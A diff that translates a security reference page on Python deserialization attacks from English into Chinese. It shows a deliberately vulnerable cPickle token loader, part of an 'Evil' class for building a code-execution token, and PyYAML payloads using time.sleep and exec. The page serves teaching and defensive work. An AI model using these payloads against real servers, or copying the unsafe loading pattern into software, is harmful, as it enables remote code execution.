@@ -1,22 +1,24 @@
-# Python Deserialization
+[原文文档](Python.en.md)
 
-> Python deserialization is the process of reconstructing Python objects from serialized data, commonly done using formats like JSON, pickle, or YAML. The pickle module is a frequently used tool for this in Python, as it can serialize and deserialize complex Python objects, including custom classes.
+# Python 反序列化
 
-## Summary
+> Python 反序列化是从序列化数据（通常使用 JSON、pickle 或 YAML 等格式）重建 Python 对象的过程。pickle 模块是 Python 中经常用于此目的的工具，因为它可以序列化和反序列化复杂的 Python 对象，包括自定义类。
 
-* [Tools](#tools)
-* [Methodology](#methodology)
+## 摘要
+
+* [工具](#工具)
+* [方法论](#方法论)
     * [Pickle](#pickle)
     * [PyYAML](#pyyaml)
-* [References](#references)
+* [参考资料](#参考资料)
 
-## Tools
+## 工具
 
-* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - Serialized payload for deserialization RCE attack on python driven applications where pickle,PyYAML, ruamel.yaml or jsonpickle module is used for deserialization of serialized data.
+* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - 用于对使用 pickle、PyYAML、ruamel.yaml 或 jsonpickle 模块进行序列化数据反序列化的 Python 驱动应用程序进行反序列化 RCE 攻击的序列化有效载荷。
 
-## Methodology
+## 方法论
 
-In Python source code, look for these sinks:
+在 Python 源代码中，查找这些接收器：
 
 * `cPickle.loads`
 * `pickle.loads`
@@ -25,8 +27,8 @@ In Python source code, look for these sinks:
 
 ### Pickle
 
-The following code is a simple example of using `cPickle` in order to generate an auth_token which is a serialized User object.
-:warning: `import cPickle` will only work on Python 2
+以下代码是使用 `cPickle` 生成身份验证令牌的简单示例，该令牌是序列化的 User 对象。
+:警告: `import cPickle` 仅在 Python 2 上工作
 
 ```python
 import cPickle
@@ -40,20 +42,20 @@ class User:
 
 h = User()
 auth_token = b64encode(cPickle.dumps(h))
-print("Your Auth Token : {}").format(auth_token)
+print("您的身份验证令牌 : {}").format(auth_token)
 ```
 
-The vulnerability is introduced when a token is loaded from an user input.
+当从用户输入加载令牌时，会引入漏洞。
 
 ```python
-new_token = raw_input("New Auth Token : ")
+new_token = raw_input("新身份验证令牌 : ")
 token = cPickle.loads(b64decode(new_token))
-print "Welcome {}".format(token.username)
+print "欢迎 {}".format(token.username)
 ```
 
-Python 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious data that will execute arbitrary code on the server.
+Python 2.7 文档明确指出，Pickle 绝不应与不受信任的源一起使用。让我们创建将在服务器上执行任意代码的恶意数据。
 
-> The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
+> pickle 模块对错误或恶意构造的数据不安全。永远不要从不受信任或未经验证的源反序列化数据。
 
 ```python
 import cPickle, os
@@ -65,12 +67,12 @@ class Evil(object):
 
 e = Evil()
 evil_token = b64encode(cPickle.dumps(e))
-print("Your Evil Token : {}").format(evil_token)
+print("您的恶意令牌 : {}").format(evil_token)
 ```
 
 ### PyYAML
 
-YAML deserialization is the process of converting YAML-formatted data back into objects in programming languages like Python, Ruby, or Java. YAML (YAML Ain't Markup Language) is popular for configuration files and data serialization because it is human-readable and supports complex data structures.
+YAML 反序列化是将 YAML 格式的数据转换回 Python、Ruby 或 Java 等编程语言中的对象的过程。YAML（YAML 不是标记语言）因其人类可读性并支持复杂的数据结构而常用于配置文件和数据交换。
 
 ```yaml
 !!python/object/apply:time.sleep [10]
@@ -95,19 +97,19 @@ state: !!python/tuple
     update: !!python/name:exec
 ```
 
-Since PyYaml version 6.0, the default loader for `load` has been switched to SafeLoader mitigating the risks against Remote Code Execution. [PR #420 - Fix](https://github.com/yaml/pyyaml/issues/420)
+从 PyYaml 版本 6.0 开始，`load` 的默认加载器已切换为 SafeLoader，降低了远程代码执行的风险。[PR #420 - 修复](https://github.com/yaml/pyyaml/issues/420)
 
-The vulnerable sinks are now `yaml.unsafe_load` and `yaml.load(input, Loader=yaml.UnsafeLoader)`.
+现在易受攻击的接收器是 `yaml.unsafe_load` 和 `yaml.load(input, Loader=yaml.UnsafeLoader)`。
 
 ```py
 with open('exploit_unsafeloader.yml') as file:
         data = yaml.load(file,Loader=yaml.UnsafeLoader)
 ```
 
-## References
+## 参考资料
 
-* [CVE-2019-20477 - 0Day YAML Deserialization Attack on PyYAML version <= 5.1.2 - Manmeet Singh (@_j0lt) - June 21, 2020](https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)
-* [Exploiting misuse of Python's "pickle" - Nelson Elhage - March 20, 2011](https://blog.nelhage.com/2011/03/exploiting-pickle/)
-* [Python Yaml Deserialization - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
-* [PyYAML Documentation - PyYAML - April 29, 2006](https://pyyaml.org/wiki/PyYAMLDocumentation)
-* [YAML Deserialization Attack in Python - Manmeet Singh & Ashish Kukret - November 13, 2021](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
+* [CVE-2019-20477 - PyYAML 版本 <= 5.1.2 上的 0Day YAML 反序列化攻击 - Manmeet Singh (@_j0lt) - 2020 年 6 月 21 日](https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)
+* [利用 Python 的 "pickle" 的滥用 - Nelson Elhage - 2011 年 3 月 20 日](https://blog.nelhage.com/2011/03/exploiting-pickle/)
+* [Python Yaml 反序列化 - HackTricks - 2024 年 7 月 19 日](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
+* [PyYAML 文档 - PyYAML - 2006 年 4 月 29 日](https://pyyaml.org/wiki/PyYAMLDocumentation)
+* [Python 中的 YAML 反序列化攻击 - Manmeet Singh & Ashish Kukret - 2021 年 11 月 13 日](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
